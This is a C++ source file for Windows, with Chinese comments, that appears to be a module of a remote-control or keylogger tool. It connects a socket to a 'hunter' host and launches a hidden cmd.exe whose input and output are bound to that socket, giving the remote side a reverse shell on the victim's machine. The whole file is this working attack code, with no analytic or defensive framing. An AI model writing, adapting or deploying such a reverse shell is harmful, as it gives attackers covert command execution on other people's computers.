#include "pch.h"
#include "Shell.h"

static Shell gShell; // 初始化类
static TcpSocket gSock; // 传递数据的套接字
// 创建命令行进程之后拿到的pi 控制cmd进程
static PROCESS_INFORMATION gPi = { 0 };

void Shell::startShell(std::string domain, int port) {
	// 新建连接到hunter端的socket连接
	if (!gSock.connectTo(domain, port)) {
		gSock.dissconnect();
		OutputDebugStringA("Failed to connect hunter for keybd\r\n");
		return;
	}
	// 启动子进程
	// 此时socket都已准备好
	// 创建沟通cmd和socket的线程函数
	HANDLE h = CreateThread(NULL, 0, Shell::threadProc, (LPVOID)NULL, 0, NULL);
	if (!h) {
		OutputDebugStringA("Failed to create new thread\r\n");
		gSock.dissconnect();
		return;
	}
	OutputDebugStringA("start shell successfully\r\n");
}

// 启动cmd子进程
bool Shell::createCmd() {
	// 因为会多次使用 所以要做好准备
	RtlZeroMemory(&gPi, sizeof(PROCESS_INFORMATION));
	// 创建cmd进程
	STARTUPINFOA si = { 0 };
	// 隐藏窗口
	si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
	si.wShowWindow = SW_HIDE;
	// 标准输入输出和错误连接至套接字
	si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)gSock.getSocket();
	// 拼接启动命令行的命令
	CHAR szCmdLine[256] = { 0 };
	GetSystemDirectoryA(szCmdLine, sizeof(szCmdLine));
	StringCchCatA(szCmdLine, _countof(szCmdLine), "\\cmd.exe");
	if (CreateProcessA(szCmdLine, NULL, NULL, NULL, TRUE, 0, NULL, NULL, &si, &gPi) == 0)
	{
		return false;
	}

	return true;
}

// 线程函数 负责沟通管道和socket
DWORD Shell::threadProc(LPVOID args) {
	// 启动cmd子进程并连接至socket
	if (!createCmd()) {
		OutputDebugStringA("create cmd exe failed\r\n");
		return -1;
	}
	WaitForSingleObject(gPi.hProcess, INFINITE);
	CloseHandle(gPi.hThread);
	CloseHandle(gPi.hProcess);
	gSock.dissconnect();
	return 1;
}
